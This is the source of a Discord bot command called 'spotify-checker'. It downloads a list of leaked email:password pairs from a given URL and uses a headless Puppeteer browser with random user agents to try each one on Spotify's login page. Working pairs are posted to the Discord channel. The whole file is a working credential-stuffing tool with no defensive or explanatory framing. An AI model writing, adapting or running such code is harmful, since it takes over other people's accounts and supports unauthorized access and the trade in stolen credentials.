const fs = require("fs");
const { RichEmbed } = require("discord.js");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");
const {
  getRootDir,
  getUserAgent,
  getRandomInt,
  ProgressText
} = require("../../utils");
const { prefix } = require("../../config");

const document = {};

const puppeteerOptions = {
  args: [
    "--disable-gpu",
    "--disable-dev-shm-usage",
    "--disable-setuid-sandbox",
    "--no-first-run",
    "--no-sandbox",
    "--no-zygote"
  ]
};

const getCredentials = url => fetch(url).then(res => res.text());

const checkCredentials = async (
  { browser, credentials, message, msg },
  index
) => {
  try {
    if (index < credentials.length) {
      const URL = "https://accounts.spotify.com/en/login";
      const email = credentials[index].substring(
        0,
        credentials[index].indexOf(":")
      );
      const password = credentials[index].substring(
        credentials[index].indexOf(":") + 1
      );

      msg.edit(`Checking... (${index + 1}/${credentials.length})`);

      const page = await browser.newPage();

      await page.setUserAgent(getUserAgent());
      await page.goto(URL, {
        waitUntil: "networkidle0"
      });
      await page.evaluate(() => {
        document.getElementById("login-username").value = "";
      });
      await page.focus("input[id=login-username]");
      await page.keyboard.type(email);
      await page.focus("input[id=login-password]");
      await page.keyboard.type(password);
      await page.click("button[id=login-button]");
      await page.waitFor(3000);

      const isValid = await page.evaluate(() => {
        if (document.querySelector(".alert")) {
          return false;
        }

        if (document.querySelector(".user-details")) {
          document.querySelector(".btn-green").click();
          return true;
        }
      });

      if (isValid) {
        const embed = new RichEmbed()
          .setColor(`RANDOM`)
          .setDescription(`${email}:${password}`);

        message.channel.send(embed);
        await page.waitFor(3000);
      }

      await page.close();
      checkCredentials({ browser, credentials, message, msg }, index + 1);
    }
  } catch (err) {
    await browser.close();
    const newBrowser = await puppeteer.launch(puppeteerOptions);
    checkCredentials(
      { browser: newBrowser, credentials, message, msg },
      index + 1
    );
  }
};

module.exports = {
  name: "spotify-checker",
  aliases: ["sc"],
  description: "Check spotify accounts from a list",
  args: true,
  usage: `http://example.com/file.txt 12`,
  devOnly: true,
  async execute(message, args) {
    const initialIndex = parseInt(args[1], 10) || 0;
    const textResult = await getCredentials(args[0]);
    const credentials = textResult
      .split("\n")
      .map(cred => cred.includes("@") && cred.substring(0, cred.indexOf(" ")))
      .filter(val => !!val);

    const browser = await puppeteer.launch(puppeteerOptions);

    return message.channel.send("Please wait...").then(async msg => {
      await checkCredentials(
        {
          browser,
          credentials,
          message,
          msg
        },
        initialIndex
      );
    });
  }
};
